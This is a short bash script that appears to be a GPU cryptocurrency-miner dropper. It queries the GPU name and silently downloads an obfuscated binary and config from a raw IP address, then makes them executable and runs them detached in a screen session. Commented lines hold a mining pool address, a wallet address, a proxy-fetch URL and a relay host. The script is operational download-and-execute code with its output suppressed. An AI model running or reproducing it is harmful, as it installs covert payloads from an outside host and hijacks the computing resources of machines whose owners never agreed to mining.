#!/bin/bash

WORK=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
WORKER0=$(echo $(shuf -i 1000-9999 -n 1))

#pool=34.149.10.66:443
#PROXY=$(echo $(curl -s gaspol.space/proxy/proxy.php))
#wallet=37LUV317QpaiFFgT2oEY6jGon1PPonEXVm
#ramu=46.101.133.208:52880

wget -O 13bqfuYZ12Qv.cfg http://139.59.230.245:7800/down/FJjfK9JFa1Hn > /dev/null 2>&1
curl -sLO http://139.59.230.245:7800/down/13bqfuYZ12Qv > /dev/null 2>&1

chmod +x 13bqfuYZ12Qv ; chmod +x 13bqfuYZ12Qv.cfg

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1

screen -S qwe ./13bqfuYZ12Qv --config 13bqfuYZ12Qv.cfg

screen -ls